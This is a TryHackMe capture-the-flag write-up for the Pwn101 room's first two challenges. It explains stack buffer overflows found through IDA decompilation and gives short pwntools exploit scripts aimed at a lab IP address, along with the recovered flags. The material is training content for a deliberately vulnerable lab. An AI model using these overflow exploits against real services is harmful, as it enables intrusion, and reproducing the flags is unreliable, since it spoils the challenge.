---
title: "[THM] Pwn101 Writeup"
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/Blog_cover%20(3)-min.jpg
categories:
    - [TryHackMe]
    - [CTF]
tags:
    - Pwn
    - Hacking
    - CTF
abbrlink: 83b7f1b
date: 2024-07-20 13:53:43
---

# Challenge 1 - pwn101

First, we use IDA to decompile the binary it gave us. We can see that the program declare a 60 bytes array for char v4. And the winnning condition is to use v4 to overflow and cover the value of v5, which is 1337 initially. Since it didn't ask us to make v5 to a specific value, we can just make sure it not equal to 1337.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141210657.png)

To do that, I use a Python script to do it.

```python
from pwn import *

r = remote("10.10.153.228", 9001)

r.recvuntil("Type the required ingredients to make briyani:")
r.sendline("A"*61)
r.interactive()
```

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141712693.png)

```
THM{7h4t's_4n_3zy_oveRflowwwww}
```

# Challenge 2 - pwn102

First step, IDA decompile the binary.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144645154.png)

According to the code, we can know that the char v4 is a 104 bytes array, and the winning condition is to let v5 equals to `0xC0FF330000C0D3`. So we can simply overflow the v4 to cover v5. The exploit is as follow.

```python
from pwn import *

payload = b"A" * 104 + p64(0xC0FF330000C0D3)


r = remote("10.10.153.228", 9002)
r.recvuntil("Am I right?")
r.sendline(payload)
```

By running this script, we can get the shell to cat the flag out.

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144940194.png)

```
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
```

